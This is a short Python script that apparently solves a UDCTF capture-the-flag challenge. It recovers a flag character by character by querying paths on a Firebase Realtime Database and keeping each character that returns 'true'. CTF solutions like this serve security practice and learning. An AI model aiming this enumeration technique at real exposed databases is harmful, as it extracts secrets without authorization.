import requests

def create_request(url):
	res = requests.get(url, headers={"Content-Type":"application/json"})
	if res.status_code == 200:
		return res.text
	else:
		return None

if __name__=="__main__":
	base_url = 'https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF{'
	chars = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-.:;?@[\]^_`{|}~"""
	result = ''
	#url = f'{base_url}.json'
	#response = create_request(url)
	
	while '}' not in result: 
		for i in range(0, len(chars)):
			url = f'{base_url}{chars[i]}.json'
			response = create_request(url)
			print(url)
			if response == 'true':
				result += chars[i]
				base_url += chars[i] 
				print(result)
				if '}' in str(result):
					break
			else:
				continue
			#break
	print("UDCTF{" + result)
